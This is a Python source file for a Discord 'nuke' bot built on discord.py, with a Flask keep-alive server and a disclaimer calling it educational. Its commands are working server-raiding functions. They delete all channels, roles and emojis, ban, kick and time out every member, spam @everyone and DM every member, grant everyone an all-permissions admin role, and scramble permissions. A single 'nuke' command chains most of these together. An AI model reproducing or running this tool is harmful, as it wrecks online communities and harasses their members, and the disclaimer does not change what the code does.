# Disclaimer: This is only for entertainment and educational purposes.
import discord
from discord.ext import commands
import asyncio
import aiohttp
import io
from datetime import datetime, timedelta
import random
import json
import sys
import traceback
import time
import os
from flask import Flask
import threading

# ===== CONFIG =====
class Config:
    TOKEN = os.getenv('DISCORD_TOKEN', '')
    PREFIX = os.getenv('BOT_PREFIX', '!')
    WHITELIST = []
    SPAM_MESSAGE = "@everyone"
    SPAM_COUNT = 10
    TEXT_TO_SPEECH = False
    DM_MESSAGE = "THE SERVER GOT NUKED"
    CHANNEL_NAME = "nuked"
    CHANNELS_COUNT = 10
    NEW_CHANNEL_NAME = "nuked"
    VOICE_CHANNELS_COUNT = 10
    VOICE_CHANNEL_NAME = "NUKED"
    CATEGORY_NAME = "NUKED"
    CATEGORIES_COUNT = 5
    THREAD_COUNT = 5
    THREAD_NAME = "nuked"
    NSFW_CHANNEL_NAME = "nuked"
    SLOWMODE_DURATION = 300
    ROLE_NAME = "nuked"
    ROLES_COUNT = 10
    NEW_ROLE_NAME = "nuked"
    ADMIN_ROLE_NAME = "ADMIN"
    SERVER_NAME = "NUKED SERVER"
    SERVER_ICON_URL = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Nuke%20Bot/server-icon.jpg"
    NICKNAME = "NUKED"
    TIMEOUT_DURATION = 28
    WEBHOOK_NAME = "NUKED"
    WEBHOOK_COUNT = 10
    WEBHOOK_RENAME = "NUKED"
    INVITE_COUNT = 10
    PIN_SPAM_COUNT = 5
    MOVE_VOICE_CHANNEL_NAME = "LOSERS"
    CHAOS_PERMISSIONS = [True, False, None]

config = Config()

# Check if token is set
if not config.TOKEN:
    print("❌ Error: DISCORD_TOKEN environment variable is not set!")
    sys.exit(1)

print(f"🔑 Token loaded: {config.TOKEN[:10]}...")

# ===== FLASK WEB SERVER (Keeps Render happy) =====
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/health')
def health():
    return "OK", 200

def run_flask():
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# Start Flask in background thread
flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()
print("🌐 Web server started")

# ===== DISCORD BOT =====
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=config.PREFIX, intents=intents)
bot.remove_command("help")

@bot.event
async def on_ready():
    print(f'✅✅✅ BOT IS ONLINE! ✅✅✅')
    print(f'Logged in as {bot.user}')
    print(f'Bot ID: {bot.user.id}')
    print(f'Prefix: {config.PREFIX}')
    print('-' * 50)
    await bot.change_presence(activity=discord.Game(name=f"{config.PREFIX}help"))

@bot.event
async def on_command(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

@bot.command()
async def ping(ctx):
    await ctx.send(f"Pong! {round(bot.latency * 1000)}ms")

@bot.command()
async def rserver(ctx):
    await ctx.guild.edit(name=config.SERVER_NAME)

@bot.command()
async def rservericon(ctx):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(config.SERVER_ICON_URL) as response:
                if response.status == 200:
                    icon_data = await response.read()
                    await ctx.guild.edit(icon=icon_data)
    except:
        pass

@bot.command()
async def cchannels(ctx, count: int = config.CHANNELS_COUNT):
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            await ctx.guild.create_text_channel(f"{config.CHANNEL_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def cvoice(ctx, count: int = config.VOICE_CHANNELS_COUNT):
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            await ctx.guild.create_voice_channel(f"{config.VOICE_CHANNEL_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def ccategory(ctx, count: int = config.CATEGORIES_COUNT):
    count = max(1, min(count, 10))
    for i in range(count):
        try:
            await ctx.guild.create_category_channel(f"{config.CATEGORY_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def cthread(ctx, count: int = config.THREAD_COUNT):
    count = max(1, min(count, 10))
    for channel in ctx.guild.text_channels:
        for i in range(count):
            try:
                await channel.create_thread(name=f"{config.THREAD_NAME}", auto_archive_duration=60)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def cnsfw(ctx, count: int = config.CHANNELS_COUNT):
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            channel = await ctx.guild.create_text_channel(f"{config.NSFW_CHANNEL_NAME}")
            await channel.edit(nsfw=True)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def dchannels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.01)
        except:
            pass
    try:
        await ctx.guild.create_text_channel(config.CHANNEL_NAME)
    except:
        pass

@bot.command()
async def dcategory(ctx):
    for category in ctx.guild.categories:
        try:
            await category.delete()
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def rchannels(ctx):
    for i, channel in enumerate(ctx.guild.channels):
        try:
            await channel.edit(name=f"{config.NEW_CHANNEL_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def nsfwall(ctx):
    for channel in ctx.guild.text_channels:
        try:
            await channel.edit(nsfw=True)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def slowmodeall(ctx, seconds: int = config.SLOWMODE_DURATION):
    seconds = max(0, min(seconds, 21600))
    for channel in ctx.guild.text_channels:
        try:
            await channel.edit(slowmode_delay=seconds)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def croles(ctx, count: int = config.ROLES_COUNT):
    count = max(1, min(count, 50))
    for i in range(count):
        try:
            await ctx.guild.create_role(name=f"{config.ROLE_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def droles(ctx):
    for role in ctx.guild.roles:
        if role.name != "@everyone" and not role.managed:
            try:
                await role.delete()
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def rroles(ctx):
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.edit(name=f"{config.NEW_ROLE_NAME}")
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def adminall(ctx):
    try:
        admin_role = await ctx.guild.create_role(name=config.ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
        for member in ctx.guild.members:
            try:
                await member.add_roles(admin_role)
                await asyncio.sleep(0.01)
            except:
                pass
    except:
        pass

@bot.command()
async def rnickall(ctx):
    for member in ctx.guild.members:
        try:
            await member.edit(nick=config.NICKNAME)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def demoteall(ctx):
    for member in ctx.guild.members:
        try:
            roles_to_remove = [role for role in member.roles if role.name != "@everyone"]
            if roles_to_remove:
                await member.remove_roles(*roles_to_remove)
                await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def moveall(ctx):
    try:
        vc = await ctx.guild.create_voice_channel(config.MOVE_VOICE_CHANNEL_NAME)
        for member in ctx.guild.members:
            if member.voice:
                try:
                    await member.move_to(vc)
                    await asyncio.sleep(0.01)
                except:
                    pass
    except:
        pass

@bot.command()
async def disconnectall(ctx):
    for member in ctx.guild.members:
        if member.voice:
            try:
                await member.move_to(None)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def banall(ctx):
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.ban()
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def unbanall(ctx):
    async for entry in ctx.guild.bans():
        try:
            await ctx.guild.unban(entry.user)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def kickall(ctx):
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.kick()
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def timeoutall(ctx):
    duration = min(config.TIMEOUT_DURATION, 28)
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.timeout(timedelta(days=duration))
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def untimeoutall(ctx):
    for member in ctx.guild.members:
        try:
            await member.timeout(None)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def spam(ctx, count: int = config.SPAM_COUNT):
    count = max(1, min(count, 50))
    for _ in range(count):
        try:
            await ctx.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def mspam(ctx, count: int = config.SPAM_COUNT):
    count = max(1, min(count, 20))
    for channel in ctx.guild.text_channels:
        for _ in range(count):
            try:
                await channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def purge(ctx):
    try:
        await ctx.channel.purge(limit=None)
    except:
        pass

@bot.command()
async def mpurge(ctx):
    for channel in ctx.guild.text_channels:
        try:
            await channel.purge(limit=None)
            await asyncio.sleep(1)
        except:
            pass

@bot.command()
async def rpins(ctx):
    for channel in ctx.guild.text_channels:
        try:
            pins = await channel.pins()
            for message in pins:
                try:
                    await message.unpin()
                    await asyncio.sleep(0.01)
                except:
                    pass
        except:
            pass

@bot.command()
async def cwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
    count = max(1, min(count, 10))
    for i in range(count):
        try:
            await ctx.channel.create_webhook(name=f"{config.WEBHOOK_NAME}")
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def mwebhooks(ctx, count: int = config.WEBHOOK_COUNT):
    count = max(1, min(count, 5))
    for channel in ctx.guild.text_channels:
        for i in range(count):
            try:
                await channel.create_webhook(name=f"{config.WEBHOOK_NAME}")
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def dwebhooks(ctx):
    for channel in ctx.guild.text_channels:
        try:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                try:
                    await webhook.delete()
                    await asyncio.sleep(0.01)
                except:
                    pass
        except:
            pass

@bot.command()
async def rwebhooks(ctx):
    for channel in ctx.guild.text_channels:
        try:
            webhooks = await channel.webhooks()
            for i, webhook in enumerate(webhooks):
                try:
                    await webhook.edit(name=f"{config.WEBHOOK_RENAME}")
                    await asyncio.sleep(0.01)
                except:
                    pass
        except:
            pass

@bot.command()
async def cinvites(ctx, count: int = config.INVITE_COUNT):
    count = max(1, min(count, 10))
    for channel in ctx.guild.text_channels:
        for _ in range(count):
            try:
                await channel.create_invite()
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def dinvites(ctx):
    invites = await ctx.guild.invites()
    for invite in invites:
        try:
            await invite.delete()
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def demojis(ctx):
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def dstickers(ctx):
    for sticker in ctx.guild.stickers:
        try:
            await sticker.delete()
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def dmall(ctx):
    for member in ctx.guild.members:
        if member != bot.user:
            try:
                await member.send(config.DM_MESSAGE)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def chaoschannels(ctx):
    channels = list(ctx.guild.channels)
    random.shuffle(channels)
    for position, channel in enumerate(channels):
        try:
            await channel.edit(position=position)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def chaosroles(ctx):
    roles = [role for role in ctx.guild.roles if role.name != "@everyone"]
    random.shuffle(roles)
    for position, role in enumerate(roles, start=1):
        try:
            await role.edit(position=position)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def chaoschannelperms(ctx):
    for channel in ctx.guild.channels:
        for role in ctx.guild.roles:
            try:
                perms = discord.PermissionOverwrite()
                perms.send_messages = random.choice(config.CHAOS_PERMISSIONS)
                perms.view_channel = random.choice(config.CHAOS_PERMISSIONS)
                perms.manage_messages = random.choice(config.CHAOS_PERMISSIONS)
                await channel.set_permissions(role, overwrite=perms)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def chaosroleperms(ctx):
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                perms = discord.Permissions()
                perms.value = random.randint(0, 2147483647)
                await role.edit(permissions=perms)
                await asyncio.sleep(0.01)
            except:
                pass

@bot.command()
async def lockdown(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def unlockall(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=None)
            await asyncio.sleep(0.01)
        except:
            pass

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    tasks = []
    tasks.append(guild.edit(name=config.SERVER_NAME))
    tasks.extend(channel.delete() for channel in guild.channels)
    tasks.extend(role.delete() for role in guild.roles if role.name != "@everyone" and not role.managed)
    tasks.extend(sticker.delete() for sticker in guild.stickers)
    tasks.extend(emoji.delete() for emoji in guild.emojis)
    tasks.append(guild.create_text_channel(config.CHANNEL_NAME))
    
    for i in range(config.CHANNELS_COUNT):
        tasks.append(guild.create_text_channel(f"{config.CHANNEL_NAME}"))
    
    for i in range(config.ROLES_COUNT):
        tasks.append(guild.create_role(name=f"{config.ROLE_NAME}"))
    
    for member in guild.members:
        if member == bot.user: continue
        if config.NICKNAME:
            tasks.append(member.edit(nick=config.NICKNAME))
        if config.DM_MESSAGE:
            tasks.append(member.send(config.DM_MESSAGE))
        if config.TIMEOUT_DURATION:
            tasks.append(member.timeout(timedelta(days=config.TIMEOUT_DURATION)))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    for channel in guild.text_channels:
        for _ in range(config.SPAM_COUNT):
            tasks.append(channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH))
    
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def kill(ctx):
    await bot.close()

@bot.command(name='help')
async def help(ctx):
    embed = discord.Embed(
        title="🖥️ Commands",
        description="List of available bot commands.",
        color=discord.Color.purple(),
        timestamp=datetime.now()
    )
    categories = {
        "🔨 Moderation": ["banall", "unbanall", "kickall", "timeoutall", "untimeoutall", "rnickall"],
        "📁 Channels": ["ccategory", "cchannels", "chaoschannels", "chaoschannelperms", "dcategory", "dchannels", "rchannels", "cthread", "cvoice", "slowmodeall", "lockdown", "unlockall", "moveall", "disconnectall"],
        "🎭 Roles": ["adminall", "croles", "chaosroles", "chaosroleperms", "droles", "rroles", "demoteall"],
        "🔗 Invites/Webhooks": ["cinvites", "dinvites", "cwebhooks", "dwebhooks", "mwebhooks", "rwebhooks"],
        "🖼️ Server": ["rserver", "rservericon", "rpins", "cnsfw", "nsfwall", "demojis", "dstickers"],
        "💬 Messages": ["purge", "mpurge", "mspam", "spam", "dmall"],
        "💥 Destructive": ["nuke"],
        "🧩 Bot": ["kill", "ping"]
    }
    for category, commands in categories.items():
        embed.add_field(
            name=category,
            value="\n".join(f"`{cmd}`" for cmd in commands),
            inline=False
        )
    await ctx.send(embed=embed)

# ===== RUN THE BOT =====
if __name__ == "__main__":
    print("🚀 Starting bot...")
    try:
        bot.run(config.TOKEN, reconnect=True)
    except Exception as e:
        print(f"❌ Error: {e}")
        traceback.print_exc()
